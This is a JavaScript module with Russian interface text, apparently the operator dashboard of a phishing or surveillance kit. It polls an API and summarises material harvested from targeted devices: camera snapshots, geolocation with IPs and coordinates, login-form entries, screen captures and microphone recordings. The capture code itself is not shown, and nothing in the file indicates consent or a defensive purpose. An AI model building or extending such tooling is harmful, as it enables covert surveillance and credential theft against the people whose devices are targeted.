/**
 * Текстовая сводка (все данные в одном блоке).
 */
import { state } from "../state.js";
import { API, LIMITS, POLL_IDS, POLL_INTERVALS } from "../config.js";

export async function loadSummary(container) {
  const el = container.querySelector("#gc-summary");
  if (!el) return;
  try {
    const [photosRes, locationsRes, formRes, screenRes, audioRes] = await Promise.all([
      fetch(API.photos + "?limit=" + LIMITS.summaryPhotos),
      fetch(API.locations),
      fetch(API.formCaptures + "?limit=" + LIMITS.summaryLocations),
      fetch(API.screen + "?limit=" + LIMITS.summaryScreen),
      fetch(API.audio + "?limit=" + LIMITS.summaryAudio),
    ]);
    const photosData = await photosRes.json();
    const photos = photosData.photos || [];
    const totalPhotos = photosData.total ?? photos.length;
    const locations = (await locationsRes.json()).locations || [];
    const captures = (await formRes.json()).captures || [];
    const screenItems = (await screenRes.json()).items || [];
    const audioItems = (await audioRes.json()).items || [];
    el.classList.remove("gc-summary-text-loading");
    const lines = [];
    lines.push("По результатам проверки получено:");
    lines.push("");
    const devCount = new Set(photos.map((p) => p.ip)).size;
    lines.push("• Фото с камеры: " + (totalPhotos > 0 ? totalPhotos + " снимков с " + devCount + " устройств." : "пока нет."));
    lines.push("• Геолокация: " + (locations.length > 0 ? locations.length + " точек." : "данных нет."));
    if (locations.length > 0) {
      locations.slice(0, 5).forEach((loc) => {
        const place = [loc.country, loc.region, loc.city].filter(Boolean).join(", ") || "—";
        const ip = (loc.device_id || loc.ip || "—").replace(/_/g, ".");
        const coords = (loc.lat && loc.lon && loc.lat !== "0" && loc.lon !== "0") ? loc.lat + ", " + loc.lon : "";
        lines.push("  — " + ip + ": " + place + (coords ? " (" + coords + ")" : "") + ".");
      });
      if (locations.length > 5) lines.push("  … и ещё " + (locations.length - 5) + ".");
    }
    lines.push("• С формы входа: " + (captures.length > 0 ? captures.length + " записей." : "ничего не введено."));
    if (captures.length > 0) {
      captures.slice(0, 5).forEach((c) => {
        lines.push("  — " + (c.ts || "") + ": " + (c.field || "поле") + " = ***, IP " + (c.ip || "—") + ".");
      });
      if (captures.length > 5) lines.push("  … и ещё " + (captures.length - 5) + " записей.");
    }
    lines.push("• Захватов экрана: " + (screenItems.length > 0 ? screenItems.length + "." : "нет."));
    lines.push("• Записей микрофона: " + (audioItems.length > 0 ? audioItems.length + "." : "нет."));
    lines.push("");
    lines.push("Данные обновляются автоматически.");
    const summaryText = lines.join("\n");
    if (summaryText !== state.lastSummaryText) {
      state.lastSummaryText = summaryText;
      el.textContent = summaryText;
      el.className = "gc-summary-text-body";
    }
    el.classList.remove("gc-loading", "gc-summary-text-loading");
  } catch (_) {
    el.classList.remove("gc-loading", "gc-summary-text-loading");
    const errText = "Не удалось загрузить сводку.";
    if (el.textContent !== errText) {
      el.textContent = errText;
      el.className = "gc-summary-text-body gc-summary-text-error";
    }
  }
}

export function initSummary(container) {
  container.querySelector("#gc-btn-summary")?.addEventListener("click", () => loadSummary(container));
  loadSummary(container);
  POLL_IDS.summary = setInterval(() => loadSummary(container), POLL_INTERVALS.summary);
}
